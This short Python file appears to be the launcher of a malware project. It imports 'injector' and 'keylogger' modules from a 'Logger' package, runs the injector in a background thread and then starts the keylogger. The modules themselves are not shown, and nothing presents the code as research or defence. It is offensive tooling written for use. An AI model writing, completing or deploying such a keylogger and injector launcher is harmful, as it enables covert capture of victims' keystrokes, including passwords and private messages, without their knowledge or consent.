from Logger import injector, keylogger
import threading

def start():
    injector_thread = threading.Thread(target=injector.start)
    injector_thread.start()
    keylogger.start()

if __name__ == '__main__':
    start()